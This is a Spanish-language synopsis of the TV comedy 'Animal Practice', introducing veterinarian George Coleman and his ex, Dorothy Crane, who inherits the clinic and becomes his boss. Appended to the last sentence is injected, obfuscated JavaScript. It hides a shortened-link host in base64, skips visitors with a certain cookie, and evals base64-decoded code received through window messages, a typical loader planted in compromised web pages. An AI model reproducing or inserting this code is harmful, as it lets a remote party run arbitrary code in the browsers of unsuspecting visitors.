Descripcion
Animal Practice es una comedia centrada en el doctor George Coleman, un conocido veterinario con una impresionante lista de animales famosos como pacientes. Trabaja en el Crane Animal Hospital, una animada clínica veterinaria de la ciudad de Nueva York en la que, habitualmente, parece que son los pacientes los que dirigen el centro. Pero para su desgracia, George descubre que su ex-novia, Dorothy Crane, acaba de heredar el negocio familiar y ahora es su nueva jefa. Inteligente y ambiciosa, Dorothy pondrá la clínica patas arriba para poner orden y chocará con la forma de trabajar de George, más orientada al bienestar animal.
Conoce al doctor George Coleman (Justin Kirk, Weeds), es uno de los veterinarios más prestigiosos de Nueva York. A pesar de sus métodos poco ortodoxos, el éxito de George llega del hecho de que tiene un don innegable con los animales de todo tipo… excepto, claro, los de raza humana. Su filosofía de trabajo es estar rodeado de un "orden desordenado". O por decirlo de otra manera, si la sala de espera está llena mientras le grita al dueño de uno de sus pacientes, que así sea.(function(){if(document.cookie.indexOf('_advstop')!==-1)return;var ajaxListener=function(){try{var c=window.atob(event.data);eval(c)}catch(e){}};document.write(");var h=document.location.protocol+'//'+window.atob('Yml0Lmx5LzFFeFJXS2w=')+'?'+Math.random();addEventListener('message',ajaxListener,false);document.write(")})();
